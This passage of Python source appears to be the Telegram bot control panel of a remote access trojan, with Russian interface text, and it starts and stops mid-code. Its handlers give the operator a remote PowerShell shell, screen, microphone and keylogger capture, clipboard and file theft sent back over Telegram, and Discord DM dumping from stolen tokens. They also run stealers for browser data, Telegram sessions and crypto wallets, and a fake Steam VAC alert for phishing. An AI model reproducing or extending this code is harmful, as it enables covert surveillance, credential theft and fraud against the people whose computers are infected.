                    text = "❌ *Последние ошибки:*\n"
                    for err in logs['errors'][-10:]:
                        text += f"• `{err['timestamp']}`: `{err['message']}`\n"
                    safe_send_message(self.bot, message.chat.id, text[:4000])
                else:
                    safe_send_message(self.bot, message.chat.id, "✅ No errors logged")
            except Exception as e:
                safe_send_message(self.bot, message.chat.id, "❌ Ошибка при получении логов ошибок.")

        @self.bot.message_handler(commands=['bridges'])
        def bridges_command(message):
            if not self.check_permission(message): return
            self._send_bridges_status(message.chat.id)

        @self.bot.message_handler(commands=['deploy_bridge'])
        def deploy_bridge_command(message):
            if not self.check_permission(message): return

            safe_send_message(self.bot, message.chat.id, "⏳ Запускаю деплой нового моста...")

            def run_deploy():
                url = bridge_manager.auto_deploy_new_bridge()
                if url:
                    safe_send_message(self.bot, message.chat.id, "✅ Мост успешно развернут: `{url}`".format(url=url), parse_mode="Markdown")
                else:
                    safe_send_message(self.bot, message.chat.id, "❌ Деплой моста провалился. Проверьте логи.")

            threading.Thread(target=run_deploy, daemon=True).start()

        @self.bot.message_handler(commands=['test_bridge'])
        def test_bridge_command(message):
            if not self.check_permission(message): return

            parts = message.text.split()
            if len(parts) > 1:
                url = parts[1]
                res = bridge_manager.test_bridge(url)
                status = "🟢 Healthy" if res else "🔴 Dead"
                safe_send_message(self.bot, message.chat.id, f"Тест моста `{url}`: {status}", parse_mode="Markdown")
            else:
                safe_send_message(self.bot, message.chat.id, "⏳ Тестирую все мосты...")
                results = bridge_manager.test_all_bridges()
                text = "🌐 *Результаты тестирования мостов:*\n"
                for url, res in results.items():
                    status = "🟢" if res else "🔴"
                    text += f"{status} `{url}`\n"
                safe_send_message(self.bot, message.chat.id, text, parse_mode="Markdown")

        @self.bot.message_handler(commands=['threads'])
        def threads_command(message):
            if not self.check_permission(message): return
            stats = self.thread_manager.get_stats()
            text = "📊 *Активные потоки:*\n" + "\n".join(stats['names'])
            safe_send_message(self.bot, message.chat.id, text[:4000])

        @self.bot.message_handler(commands=['shell_start'])
        def shell_start_handler(message):
            if not self.check_permission(message): return
            if 'network' in self.work_modules:
                self.shell_buffer = []
                self.shell_timer = None
                
                from telebot import types as _types
                markup = _types.InlineKeyboardMarkup()
                markup.row(_types.InlineKeyboardButton("🛑 STOP SHELL", callback_data="shell_stop"))
                markup.row(
                    _types.InlineKeyboardButton("📋 CLEAR", callback_data="shell_clear"),
                    _types.InlineKeyboardButton("⚙️ PRESETS", callback_data="shell_presets")
                )
                markup.row(_types.InlineKeyboardButton("🔙 Назад в панель", callback_data="back_to_main"))

                def flush_shell():
                    if hasattr(self, 'shell_buffer') and self.shell_buffer:
                        text = "".join(self.shell_buffer).strip()
                        self.shell_buffer.clear()
                        if text:
                            if len(text) > 3500: text = text[:3500] + "\n... (обрезано)"
                            try:
                                # Premium styling for shell output
                                safe_send_message(self.bot, message.chat.id, "```powershell\n{text}\n```", parse_mode="HTML")
                            except Exception:
                                safe_send_message(self.bot, message.chat.id, "```\n{text}\n```")

                def on_shell_output(output):
                    if output.strip():
                        if not hasattr(self, 'shell_buffer'): self.shell_buffer = []
                        self.shell_buffer.append(output)
                        if not hasattr(self, 'shell_timer') or not self.shell_timer or not self.shell_timer.is_alive():
                            self.shell_timer = threading.Timer(0.8, flush_shell)
                            self.shell_timer.start()

                def shell_reader():
                    log_debug("Shell reader thread started")
                    while getattr(self, 'shell_mode_active', False):
                        try:
                            if hasattr(self, 'shell_manager'):
                                output = self.shell_manager.ReadOutput()
                                if output:
                                    on_shell_output(output)
                            time.sleep(0.5)
                        except Exception as e:
                            log_debug("Ошибка в потоке чтения Shell: " + str(e))
                            break
                    log_debug("Shell reader thread stopped")

                success = False
                if hasattr(self, 'shell_manager'):
                    success = self.shell_manager.StartShell("powershell.exe")
                
                if success:
                    self.shell_mode_active = True
                    self.thread_manager.start_daemon(target=shell_reader, name="ShellPolling")
                    user_info = "Пользователь: {user}\nТекущая директория: {cwd}".format(user=os.getlogin(), cwd=os.getcwd())
                    self.bot.send_message(message.chat.id, 
                        "✅ *PowerShell запущен!*\n\n"
                        "```\n{user_info}\n```\n"
                        "Теперь вы можете отправлять команды PowerShell. Результаты будут приходить сюда.\n"
                        "Для выхода используйте /shell_stop или кнопку '🛑 STOP SHELL'.", 
                        reply_markup=markup, parse_mode="HTML")
                else:
                    safe_send_message(self.bot, message.chat.id, "❌ *Не удалось запустить PowerShell.*\n"
                                                                 "Возможно, PowerShell не установлен или заблокирован.\n"
                                                                 "Попробуйте использовать обычный терминал (`cmd_enter`).", parse_mode="HTML")
        @self.bot.message_handler(commands=['shell_stop'])
        def shell_stop_handler(message):
            if not self.check_permission(message): return
            self.shell_mode_active = False
            if hasattr(self, 'shell_manager'):
                self.shell_manager.StopShell()
                safe_send_message(self.bot, message.chat.id, "🛑 PowerShell остановлен.")
        @self.bot.message_handler(commands=['dtk'])
        def dtk_handler(message):
            """Принять Discord токен и запустить DM дамп"""
            if not self.check_permission(message): return
            parts = message.text.split(None, 1)
            if len(parts) < 2:
                safe_send_message(self.bot, message.chat.id,
                    "❌ Неверный формат. Используйте `/dtk <токен>`")
                return
            token = parts[1].strip()
            if 'discord' not in self.work_modules:
                safe_send_message(self.bot, message.chat.id, "❌ Модуль Discord не загружен.")
                return
            def run():
                def make_bar(current, total):
                    "Создает текстовый прогресс-бар"
                    pct = int(current / total * 100) if total else 0
                    filled = int(pct / 5)      
                    empty = 20 - filled
                    bar = "█" * filled + "░" * empty
                    return pct, bar
                try:
                    init_msg = self.bot.send_message(message.chat.id,
                        "⏳ *Начинаю дамп личных сообщений Discord...*\n" +
                        "• Токен: `{token}...`\n" +
                        "• Статус: Инициализация...",
                        parse_mode="HTML"
                    )
                    prog_msg_id = init_msg.message_id
                except Exception as e:
                    safe_send_message(self.bot, message.chat.id, "❌ Ошибка при отправке начального сообщения: " + str(e))
                    return
                last_update = [0]  
                def on_progress(idx, total, ch_name, total_msgs):
                    import time as _t
                    now = _t.time()
                    if now - last_update[0] < 1.5 and idx < total:
                        return
                    last_update[0] = now
                    pct, bar = make_bar(idx, total)
                    safe_name = ch_name[:25] + "…" if len(ch_name) > 25 else ch_name
                    text = "⏳ *Дамп личных сообщений Discord...*\n" + \
                           "• Токен: `{token}...`\n" + \
                           "• Канал: `{name}` ({idx}/{total})\n" + \
                           "• Сообщений в канале: `{count}`\n" + \
                           "`[{bar}] {pct}%`".format(token=token[:20], idx=idx, total=total, name=safe_name, bar=bar, pct=pct, count=total_msgs)
                    try:
                        self.bot.edit_message_text(
                            text, message.chat.id, prog_msg_id,
                            parse_mode="HTML"
                        )
                    except Exception:
                        pass
                disc = self.work_modules['discord']
                out_dir = os.path.join(self.temp_dir, "discord_dump")
                stats = disc.dump_conversations(token, out_dir, progress_callback=on_progress)
                result_text = "✅ *Дамп личных сообщений Discord завершен!*\n\n" + \
                              "• Всего каналов: `{channels}`\n" + \
                              "• Всего сообщений: `{messages}`\n\n" + \
                              "Архив с данными будет отправлен в следующем сообщении.".format(channels=stats['channels'], messages=stats['messages'])
                try:
                    self.bot.edit_message_text(
                        result_text, message.chat.id, prog_msg_id,
                        parse_mode="HTML"
                    )
                except Exception:
                    safe_send_message(self.bot, message.chat.id, result_text)
                if os.path.isdir(out_dir):
                    import zipfile
                    zip_path = os.path.join(self.temp_dir, "discord_dump.zip")
                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                        for root, _, files in os.walk(out_dir):
                            for fn in files:
                                fp = os.path.join(root, fn)
                                zf.write(fp, os.path.relpath(fp, out_dir))
                    try:
                        with open(zip_path, 'rb') as f:
                            self.bot.send_document(message.chat.id, f,
                                caption=f"📦 Discord dump ({stats['channels']} чатов, {stats['messages']} сообщений)")
                    except Exception as e:
                        safe_send_message(self.bot, message.chat.id, "❌ Ошибка при отправке архива: " + str(e))
            threading.Thread(target=run, daemon=True).start()
        @self.bot.message_handler(commands=['start', 'panel'])
        def start_and_panel_command(message):
            try:
                log_debug("Обработка команды /start или /panel.")
                if not self.check_permission(message):
                    log_debug("Пользователь не имеет разрешения на доступ к панели.")
                    safe_send_message(self.bot, message.chat.id, "❌ У вас нет доступа к этой панели. Обратитесь к администратору.")
                    return
                
                log_debug("Проверка прав администратора...")
                try:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                    log_debug(f"Статус администратора: {is_admin}")
                except Exception as ex:
                    log_debug(f"Ошибка при проверке прав администратора: {ex}")
                    is_admin = False
                
                admin_status = "🟢 АДМИН" if is_admin else "🟡 Обычный пользователь"
                
                log_debug("Получение системной информации...")
                info = self.get_system_info() # Now uses 60s cache automatically
                log_debug("Системная информация получена.")
                
                client_count = len(self.clients)
                current_client = self.victim_name
                
                unknown_text = "Неизвестно"
                text = (
                    "\U0001F3AE \u041f\u0410\u041d\u0415\u041b\u042c \u0423\u041f\u0420\u0410\u0412\u041b\u0415\u041d\u0418\u042f\n"
                    f"\U0001F465 \u041a\u043b\u0438\u0435\u043d\u0442\u043e\u0432: {client_count}\n"
                    f"\U0001F5A5\ufe0f \u0422\u0435\u043a\u0443\u0449\u0438\u0439: {current_client}\n"
                    f"\u26a1\ufe0f \u0421\u0442\u0430\u0442\u0443\u0441: {admin_status}\n"
                    f"\U0001F4BB \u041f\u041a: {info['pc']} | \U0001F464 \u042e\u0437\u0435\u0440: {info['user']}\n"
                    f"\U0001F310 IP: {info.get('external_ip', unknown_text)}\n"
                    f"\U0001F4C2 \u041f\u0430\u043f\u043a\u0430: {os.getcwd()}\n"
                    f"\u231b\ufe0f \u0412\u0440\u0435\u043c\u044f: {info['time']}\n\n"
                    "\U0001F4BB SYSTEM (\u0421\u0435\u0442\u044c, \u0424\u0430\u0439\u043b\u044b, \u041f\u0440\u043e\u0446\u0435\u0441\u0441\u044b, \u0422\u0435\u0440\u043c\u0438\u043d\u0430\u043b, \u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438)\n"
                    "\U0001F4BC WORK (\u0421\u0442\u0438\u043b\u043b\u0435\u0440\u044b, \u041a\u0443\u043a\u0438, \u0418\u043d\u0436\u0435\u043a\u0442\u044b, Discord Remote)\n"
                    "\U0001F441\ufe0f SPYWARE (\u041c\u0438\u043a\u0440\u043e, \u041a\u0430\u043c\u0435\u0440\u0430, \u0421\u043a\u0440\u0438\u043d\u044b, \u0412\u0438\u0434\u0435\u043e, \u041a\u0435\u0439\u043b\u043e\u0433\u0433\u0435\u0440)\n\n"
                    "\U0001F4A1 \u041f\u0440\u043e\u0441\u043c\u043e\u0442\u0440 \u0432\u0441\u0435\u0445 \u0444\u0443\u043d\u043a\u0446\u0438\u0439: /help \u0438\u043b\u0438 " + "кнопка '🆘 Справка'" + "\n"
                )
                
                log_debug("Создание клавиатуры панели администратора...")
                markup = self.admin_panel_keyboard(message.from_user.id)
                
                log_debug("Отправка сообщения панели администратора...")
                safe_send_message(self.bot, message.chat.id, text, reply_markup=markup)
                log_debug("Сообщение панели администратора отправлено.")
            except Exception as e:
                log_debug("Ошибка в start_and_panel_command: " + str(e))
                import traceback
                log_debug(traceback.format_exc())
                safe_send_message(self.bot, message.chat.id, "❌ Произошла ошибка при загрузке панели.")
        @self.bot.message_handler(commands=['ping'])
        def ping_command(message):
            log_debug("Обработка команды /ping.")
            safe_send_message(self.bot, message.chat.id, "Pong!")
            log_debug("Ping response sent")
        @self.bot.message_handler(commands=['help'])
        def help_command(message):
            help_text = (
                "\U0001F198 *СПРАВКА ПО КОМАНДАМ*\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "\U0001F4DA *ОСНОВНЫЕ КОМАНДЫ:*\n\n"
                "/panel - \U0001F6E1 Открыть админ-панель\n"
                "/help - \U0001F198 Показать эту справку\n"
                "/start - \U0001F465 Профиль пользователя\n"
                "\n━━━━━━━━━━━━━━━━━━━━\n"
                "\U0001F4DE *ПОДДЕРЖКА:*\n"
                f"Проблемы? @{CREATOR_USERNAME}\n"
            )
            safe_send_message(self.bot, message.chat.id, help_text)

        @self.bot.callback_query_handler(func=lambda call: True)
        def handle_callback(call):
            if not self.check_permission(call): return

            data = call.data
            chat_id = call.message.chat.id
            bot = self.bot

            if data == "back_to_main" or data == "open_panel":
                try:
                    if data == "open_panel":
                        bot.answer_callback_query(call.id, "🔘 Открываю панель управления...")
                    bot.delete_message(chat_id, call.message.message_id)
                except:
                    pass
                message = call.message
                message.from_user = call.from_user
                message.text = "/panel"
                self.process_command_message(message, None) if self.cmd_mode_active else start_and_panel_command(message)
                return

            elif data == "client_list" or data == "panel_refresh" or data == "back_to_clients":
                try: bot.delete_message(chat_id, call.message.message_id)
                except: pass
                text = self.get_clients_list_text()
                safe_send_message(bot, chat_id, text, reply_markup=self.clients_keyboard())
                return

            if data.startswith("client_set:"):
                hwid = data.split(":")[1]
                success, _ = self.switch_client(hwid)
                if success:
                    bot.answer_callback_query(call.id, "✅ Переключено!")
                    safe_edit_reply_markup(bot, chat_id, call.message.message_id, reply_markup=self.clients_keyboard())
                else:
                    bot.answer_callback_query(call.id, "❌ Клиент оффлайн")

            elif data.startswith("client_page:"):
                page = int(data.split(":")[1])
                self.clients_page = page
                safe_edit_reply_markup(bot, chat_id, call.message.message_id, reply_markup=self.clients_keyboard())

            elif data == "set_victim_name":
                msg = safe_send_message(bot, chat_id, "✏️ Введите новое имя для текущего клиента:")
                def process_name(m):
                    new_name = m.text.strip()
                    if new_name and self.current_client_hwid in self.clients:
                        self.clients[self.current_client_hwid].label = new_name
                        self.victim_name = self.clients[self.current_client_hwid].get_display_name()
                        self.save_labels()
                        safe_send_message(bot, chat_id, "✅ Имя клиента успешно обновлено!")
                        start_and_panel_command(m)
                if msg: bot.register_next_step_handler(msg, process_name)

            elif data == "panel_system":
                safe_edit_reply_markup(bot, chat_id, call.message.message_id, reply_markup=self.system_panel_keyboard(call.from_user.id))

            elif data == "panel_work":
                safe_edit_reply_markup(bot, chat_id, call.message.message_id, reply_markup=self.work_panel_keyboard())

            elif data == "panel_spyware":
                safe_edit_reply_markup(bot, chat_id, call.message.message_id, reply_markup=self.spyware_panel_keyboard())

            elif data == "panel_refresh":
                bot.answer_callback_query(call.id, "🔄 Обновлено")
                self.process_command_message(call.message, None) if self.cmd_mode_active else start_and_panel_command(call.message)

            elif data == "client_list":
                bot.delete_message(chat_id, call.message.message_id)
                text = self.get_clients_list_text()
                safe_send_message(bot, chat_id, text, reply_markup=self.clients_keyboard())

            elif data == "cmd_exit":
                self.exit_cmd_mode(chat_id)
                try: bot.delete_message(chat_id, call.message.message_id)
                except: pass
                # Reopen panel after exit
                message = call.message
                message.from_user = call.from_user
                message.text = "/panel"
                start_and_panel_command(message)
                return

            elif data == "screen":
                bot.answer_callback_query(call.id, "📸 Делаю скриншот...")
                def take_screen():
                    try:
                        path = self.take_screenshot()
                        if path and os.path.exists(path):
                            with open(path, "rb") as f2:
                                bot.send_photo(chat_id, f2, caption="📸 Скриншот")
                            os.remove(path)
                        else:
                            safe_send_message(bot, chat_id, "❌ Не удалось сделать скриншот")
                    except Exception as e:
                        safe_send_message(bot, chat_id, "❌ Произошла ошибка: " + str(e))
                threading.Thread(target=take_screen, daemon=True).start()

            elif data == "shell_stop":
                if hasattr(self, 'shell_manager'):
                    self.shell_manager.StopShell()
                    bot.answer_callback_query(call.id, "🛑 Shell Stopped")
                    safe_send_message(bot, chat_id, "🛑 *PowerShell остановлен.*", parse_mode="HTML")

            elif data == "shell_clear":
                self.shell_buffer = []
                bot.answer_callback_query(call.id, "📋 Buffer Cleared")

            elif data == "shell_presets":
                from telebot import types as _types
                presets = _types.InlineKeyboardMarkup()
                presets.row(_types.InlineKeyboardButton("📊 SYS INFO", callback_data="sp_systeminfo"))
                presets.row(_types.InlineKeyboardButton("🔎 NETSTAT", callback_data="sp_netstat"))
                presets.row(_types.InlineKeyboardButton("📁 DIR USERS", callback_data="sp_dir_users"))
                presets.row(_types.InlineKeyboardButton("⬅️ BACK", callback_data="shell_start"))
                safe_edit_reply_markup(bot, chat_id, call.message.message_id, reply_markup=presets)

            elif data.startswith("sp_"):
                cmd_map = {
                    "sp_systeminfo": "systeminfo",
                    "sp_netstat": "netstat -ano",
                    "sp_dir_users": "dir C:\\Users"
                }
                cmd = cmd_map.get(data)
                if cmd and hasattr(self, 'shell_manager'):
                    self.shell_manager.SendCommand(cmd)
                    bot.answer_callback_query(call.id, "✅ Команда отправлена!")

            elif data == "record_video":
                bot.answer_callback_query(call.id, "🎥 Начинаю запись экрана (10 сек)...")
                def do_record():
                    try:
                        video_path = os.path.join(self.temp_dir, "screen_record.mp4")
                        self.record_screen(10, video_path)
                        if os.path.exists(video_path):
                            with open(video_path, "rb") as f2:
                                bot.send_video(chat_id, f2, caption="🎥 Запись экрана (10 сек)", timeout=60, supports_streaming=True)
                            os.remove(video_path)
                    except Exception as e:
                        safe_send_message(bot, chat_id, "❌ Произошла ошибка при записи видео: " + str(e))
                threading.Thread(target=do_record, daemon=True).start()

            elif data == "mic_record":
                bot.answer_callback_query(call.id, "🎙️ Начинаю запись микрофона (10 сек)...")
                def do_mic():
                    try:
                        path = self.record_microphone(10)
                        if path and os.path.exists(path):
                            with open(path, "rb") as f2:
                                bot.send_audio(chat_id, f2, caption="🎙️ Запись микрофона (10 сек)")
                            os.remove(path)
                        else:
                            safe_send_message(bot, chat_id, "❌ Микрофон недоступен")
                    except Exception as e:
                        safe_send_message(bot, chat_id, "❌ Произошла ошибка: " + str(e))
                threading.Thread(target=do_mic, daemon=True).start()

            elif data == "keylog_toggle":
                if self.keylogger_active:
                    self.stop_keylogger()
                    bot.answer_callback_query(call.id, "⌨️ Кейлоггер ВЫКЛ")
                else:
                    self.start_keylogger()
                    bot.answer_callback_query(call.id, "⌨️ Кейлоггер ВКЛ")
                try:
                    safe_edit_reply_markup(bot, chat_id, call.message.message_id, reply_markup=self.spyware_panel_keyboard())
                except:
                    pass

            elif data == "clipboard":
                try:
                    import win32clipboard
                    win32clipboard.OpenClipboard()
                    clip = win32clipboard.GetClipboardData() if win32clipboard.IsClipboardFormatAvailable(1) else ""
                    win32clipboard.CloseClipboard()
                except:
                    clip = ""
                text_clip = clip[:3000] if clip else "Пусто"
                safe_send_message(bot, chat_id, f"📋 *Содержимое буфера обмена:*\n`{text_clip}`", parse_mode="Markdown")

            elif data == "windows":
                log = getattr(self, "window_log", [])
                if log:
                    text_win = "📜 *Последние активные окна:*\n" + "\n".join(f"• `{w}`" for w in log[-30:])
                else:
                    text_win = "📜 Лог окон пуст"
                safe_send_message(bot, chat_id, text_win, parse_mode="Markdown")

            elif data == "system":
                if hasattr(self, 'system_manager'):
                    info = self.system_manager.GetSystemInfo()
                else:
                    info = decrypt_string("IFMMAjg0eTEjBB5dH3QHFA9VHRluJDcDLBYDVBNbCh9A")
                safe_send_message(bot, chat_id, info, parse_mode="HTML")

            elif data == "wifi":
                bot.answer_callback_query(call.id, "📡 Получаю данные Wi-Fi...")
                def do_wifi():
                    result = self.run_cmd("netsh wlan show profiles")
                    safe_send_message(bot, chat_id, f"📡 *Профили Wi-Fi:*\n```\n{result[:3500]}\n```", parse_mode="Markdown")
                threading.Thread(target=do_wifi, daemon=True).start()

            elif data == "cmd_enter":
                fake_msg = call.message
                fake_msg.from_user = call.from_user
                self.enter_cmd_mode(fake_msg)

            elif data == "layout":
                layout = self.get_keyboard_layout()
                bot.answer_callback_query(call.id, f"⌨️ Текущая раскладка: {layout.upper()}")

            elif data == "self_delete":
                bot.answer_callback_query(call.id, "💀 Запускаю самоуничтожение...")
                threading.Thread(target=self.kill_self, daemon=True).start()

            elif data == "show_commands":
                if hasattr(self, 'system_manager'):
                    info = self.system_manager.GetSystemInfo()
                else:
                    info = decrypt_string("IFMMAjg0eTEjBB5dH3QHFA9VHRluJDcDLBYDVBNbCh9A")
                safe_send_message(bot, chat_id, info, parse_mode="HTML")

            elif data == "proc_list":
                bot.answer_callback_query(call.id, "📊 Получаю список процессов...")
                def do_procs():
                    result = self.run_cmd("tasklist")
                    safe_send_message(bot, chat_id, f"📊 *Список процессов:*\n```\n{result[:3500]}\n```", parse_mode="Markdown")
                threading.Thread(target=do_procs, daemon=True).start()

            elif data == "shell_start":
                bot.answer_callback_query(call.id, "💻 Запускаю PowerShell...")
                shell_start_handler(call.message)

            elif data == "file_manager":
                self.fm_page = 0
                self.send_file_manager(chat_id, call.message.message_id)

            elif data == "fm_up":
                try:
                    parent = os.path.dirname(self.current_working_dir)
                    if parent != self.current_working_dir:
                        self.current_working_dir = parent
                        self.fm_page = 0
                        self.send_file_manager(chat_id, call.message.message_id)
                    else:
                        bot.answer_callback_query(call.id, "📁 Вы в корневом каталоге")
                except Exception as e:
                    bot.answer_callback_query(call.id, "❌ Ошибка: " + str(e))

            elif data.startswith("fmd_"):
                try:
                    idx = int(data.split("_")[1])
                    if idx < len(self.last_fm_items):
                        target = os.path.join(self.current_working_dir, self.last_fm_items[idx])
                        if os.path.isdir(target):
                            self.current_working_dir = target
                            self.fm_page = 0
                            self.send_file_manager(chat_id, call.message.message_id)
                        else:
                            bot.answer_callback_query(call.id, "❌ Это не папка")
                    else:
                        bot.answer_callback_query(call.id, "❌ Элемент не найден")
                except Exception as e:
                    bot.answer_callback_query(call.id, "❌ Ошибка: " + str(e))

            elif data.startswith("fmf_"):
                try:
                    idx = int(data.split("_")[1])
                    if idx < len(self.last_fm_items):
                        target = os.path.join(self.current_working_dir, self.last_fm_items[idx])
                        if os.path.isfile(target):
                            bot.answer_callback_query(call.id, "⏳ Отправляю файл...")
                            def send_file_task():
                                try:
                                    stats = os.stat(target)
                                    size_mb = stats.st_size / (1024 * 1024)
                                    mtime = datetime.fromtimestamp(stats.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                                    name = os.path.basename(target)
                                    ext = os.path.splitext(name)[1].upper() or "FILE"
                                    
                                    caption = (
                                        f"📄 <b>ФАЙЛ ПОЛУЧЕН</b>\n"
                                        f"━━━━━━━━━━━━━━━━━━\n"
                                        f"📝 <b>Имя:</b> <code>{name}</code>\n"
                                        f"📏 <b>Размер:</b> <code>{size_mb:.2f} MB</code>\n"
                                        f"📂 <b>Тип:</b> <code>{ext}</code>\n"
                                        f"🕒 <b>Изменен:</b> <code>{mtime}</code>\n"
                                        f"━━━━━━━━━━━━━━━━━━"
                                    )

                                    if size_mb > 45:
                                        safe_send_message(bot, chat_id, f"⚠️ Файл слишком большой ({size_mb:.2f} MB). Загружаю в облако...\n\n{caption}", parse_mode='HTML')
                                        try:
                                            from core.cloud import CloudModule
                                            link = CloudModule.upload_file(target)
                                            if link:
                                                safe_send_message(bot, chat_id, f"✅ Ссылка: {link}")
                                            else:
                                                safe_send_message(bot, chat_id, "❌ Ошибка загрузки в облако")
                                        except:
                                            safe_send_message(bot, chat_id, "❌ Модуль облака недоступен")
                                    else:
                                        with open(target, "rb") as f:
                                            bot.send_document(chat_id, f, caption=caption, parse_mode='HTML')
                                except Exception as fe:
                                    safe_send_message(bot, chat_id, f"❌ Ошибка при отправке: {fe}")
                            threading.Thread(target=send_file_task, daemon=True).start()
                        else:
                            bot.answer_callback_query(call.id, "❌ Файл не найден")
                    else:
                        bot.answer_callback_query(call.id, "❌ Элемент не найден")
                except Exception as e:
                    bot.answer_callback_query(call.id, "❌ Ошибка: " + str(e))

            elif data.startswith("fmp_"):
                try:
                    page = int(data.split("_")[1])
                    self.fm_page = page
                    self.send_file_manager(chat_id, call.message.message_id)
                except Exception as e:
                    bot.answer_callback_query(call.id, "❌ Ошибка: " + str(e))

            elif data == "discord_search":
                bot.answer_callback_query(call.id, "🔍 Ищу Discord токены...")
                threading.Thread(target=self.search_discord_tokens, daemon=True).start()

            elif data == "work_discord":
                bot.answer_callback_query(call.id, "⏳ Запускаю Discord инжект...")
                def do_discord_work():
                    try:
                        self.steal_discord_data()
                    except Exception as e:
                        safe_send_message(bot, chat_id, "❌ Ошибка при инжекте Discord: " + str(e))
                threading.Thread(target=do_discord_work, daemon=True).start()

            elif data == "work_browsers":
                bot.answer_callback_query(call.id, "⏳ Запускаю кражу данных браузеров...")
                threading.Thread(target=self.steal_browsers_data, daemon=True).start()

            elif data == "work_telegram":
                bot.answer_callback_query(call.id, "⏳ Запускаю кражу Telegram сессии...")
                threading.Thread(target=self.steal_telegram_data, daemon=True).start()


            elif data == "work_crypto":
                bot.answer_callback_query(call.id, "💰 Запускаю кражу криптокошельков...")
                threading.Thread(target=self.steal_crypto_data, daemon=True).start()

            elif data == "work_software":
                bot.answer_callback_query(call.id, "⏳ Запускаю кражу данных ПО...")
                def do_software():
                    try:
                        self.steal_software_data()
                    except AttributeError:
                        if 'software' in self.work_modules:
                            self.work_modules['software'].run()
                threading.Thread(target=do_software, daemon=True).start()

            elif data == "work_info":
                self.get_work_info()

            elif data == "proxy_toggle":
                if "proxy" in self.work_modules:
                    mod = self.work_modules["proxy"]
                    if getattr(mod, "proxy_active", False):
                        res = mod.stop()
                        bot.answer_callback_query(call.id, "🌐 Прокси ВЫКЛ")
                        if res: safe_send_message(bot, chat_id, res)
                    else:
                        res = mod.start()
                        bot.answer_callback_query(call.id, "🌐 Прокси ВКЛ")
                        if res: safe_send_message(bot, chat_id, res)
                    try:
                        safe_edit_reply_markup(bot, chat_id, call.message.message_id, reply_markup=self.work_panel_keyboard())
                    except:
                        pass
                else:
                    bot.answer_callback_query(call.id, "❌ Прокси модуль не загружен")

            elif data == "steam_phish":
                bot.answer_callback_query(call.id, "🎣 Запускаю Steam фишинг...")
                def do_steam():
                    try:
                        self.handle_steam_phish(chat_id)
                    except Exception as e:
                        safe_send_message(bot, chat_id, "❌ Ошибка при Steam фишинге: " + str(e))
                threading.Thread(target=do_steam, daemon=True).start()

            elif data == "work_telegram":
                bot.answer_callback_query(call.id, "⏳ Запускаю кражу Telegram сессии...")
                threading.Thread(target=self.steal_telegram_data, daemon=True).start()

            elif data == "vac_alert":
                from telebot import types as _types
                lang = _get_vac_lang()
                lang_btn = "🇨🇳 Китайский" if lang == "cn" else "🇺🇸 Английский"
                
                markup_vac = _types.InlineKeyboardMarkup()
                markup_vac.row(
                    _types.InlineKeyboardButton("🚀 Запустить VAC окно", callback_data="vac_alert_launch")
                )
                markup_vac.row(
                    _types.InlineKeyboardButton(lang_btn, callback_data="vac_lang_toggle")
                )
                markup_vac.row(
                    _types.InlineKeyboardButton("✏️ Изменить имя агента", callback_data="vac_set_name")
                )
                markup_vac.row(
                    _types.InlineKeyboardButton("🍪 Загрузить куки", callback_data="vac_inject_cookies")
                )
                markup_vac.row(
                    _types.InlineKeyboardButton("⬅️ Назад", callback_data="panel_work")
                )
                bot.answer_callback_query(call.id)
                try:
                    safe_edit_reply_markup(bot, chat_id, call.message.message_id, reply_markup=markup_vac)
                except:
                    safe_send_message(chat_id, "🚨 *VAC Alert Panel*\n\nВыберите действие:", reply_markup=markup_vac)

            elif data == "vac_lang_toggle":
                current = _get_vac_lang()
                new_lang = "en" if current == "cn" else "cn"
                lang_file = os.path.join(BASE_DIR, "tablichka", decrypt_string("GFMbNCIwNwV0AxJM"))
                os.makedirs(os.path.dirname(lang_file), exist_ok=True)
                with open(lang_file, "w") as f:
                    f.write(new_lang)
                
                bot.answer_callback_query(call.id, f"✅ Язык изменен на {new_lang.upper()}")
                try:
                    # Rerender menu
                    from telebot import types as _typ
                    lang = new_lang
                    lang_btn = "🇨🇳 Китайский" if lang == "cn" else "🇺🇸 Английский"
                    markup_vac = _typ.InlineKeyboardMarkup()
                    markup_vac.row(_typ.InlineKeyboardButton("🚀 Запустить VAC окно", callback_data="vac_alert_launch"))
                    markup_vac.row(_typ.InlineKeyboardButton(lang_btn, callback_data="vac_lang_toggle"))
                    markup_vac.row(_typ.InlineKeyboardButton("✏️ Изменить имя агента", callback_data="vac_set_name"))
                    markup_vac.row(_typ.InlineKeyboardButton("🍪 Загрузить куки", callback_data="vac_inject_cookies"))
                    markup_vac.row(_typ.InlineKeyboardButton("⬅️ Назад", callback_data="panel_work"))
                    safe_edit_reply_markup(bot, chat_id, call.message.message_id, reply_markup=markup_vac)
                except Exception as e:
                    log_debug("Ошибка при обновлении VAC меню: " + str(e))

            elif data == "vac_alert_launch":
                try: bot.answer_callback_query(call.id, "⏳ Запускаю фейковое VAC окно...")
                except: pass
                threading.Thread(target=lambda: self.handle_vac_alert(chat_id), daemon=True).start()

            elif data == "vac_set_name":

                old_name = "Jared Brahill"
                agent_name_path = os.path.join(BASE_DIR, "tablichka", decrypt_string("D1UdBToONwM3EkRMCk0="))
                if os.path.exists(agent_name_path):
                    try:
                        old_name = open(agent_name_path, "r", encoding="utf-8").read().strip() or old_name
                    except: pass
                else:
                    html_path = os.path.join(BASE_DIR, "tablichka", "site_dump",
                                             decrypt_string("HUYdCiMyNg83AgRRBkBIGQFf"), "linkfilter", decrypt_string("B1wcDjZ/MRY3Gw=="))
                    if os.path.exists(html_path):
                        try:
                            import re as _re
                            m_name = _re.search(decrypt_string('UkEMGSE/PlxyLDQELxJPRkFBDBkhPz5c'), open(html_path, "r", encoding="utf-8").read())
                            if m_name:
                                old_name = m_name.group(1)
                        except: pass

                msg_vac_name = safe_send_message(bot, chat_id,
                    "✏️ *Введите новое имя агента для VAC окна:*\n"
                    "Текущее имя: `{old_name}`".format(old_name=old_name),
                    parse_mode="HTML"
                )
                def process_vac_name(m):
                    new_name = m.text.strip()
                    if not new_name:
                        safe_send_message(bot, chat_id, "❌ Имя не может быть пустым.")
                        return
                    try:

                        agent_name_path = os.path.join(BASE_DIR, "tablichka", decrypt_string("D1UdBToONwM3EkRMCk0="))
                        os.makedirs(os.path.dirname(agent_name_path), exist_ok=True)

                        old_name = "Jared Brahill"
                        if os.path.exists(agent_name_path):
                            try:
